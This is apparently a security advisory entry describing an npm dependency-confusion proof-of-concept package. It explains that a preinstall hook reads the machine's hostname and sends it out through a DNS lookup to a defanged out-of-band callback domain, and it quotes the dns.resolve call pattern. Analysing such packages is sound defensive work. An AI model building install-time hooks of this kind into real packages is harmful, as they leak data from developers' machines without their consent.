details: This package is a dependency-confusion proof of concept. Its package.json preinstall hook runs preinstall.js, which reads the machine's hostname via os.hostname(), reduces it to a DNS-label-safe string, and resolves it as a subdomain under an out-of-band callback domain: dns.resolve('<hostname>.ngp-ui.context-providers.oob[.]jr0ch17[.]com'). The payload is DNS-only and metadata-only — it reads no credentials, tokens, environment values or files, spawns no processes, and sends nothing beyond the sanitised hostname. The package is published at a sentinel version (99.0.0) with an almost empty tarball, the standard placeholder shape used to test whether an internal scoped name can be claimed; index.js contains no code.
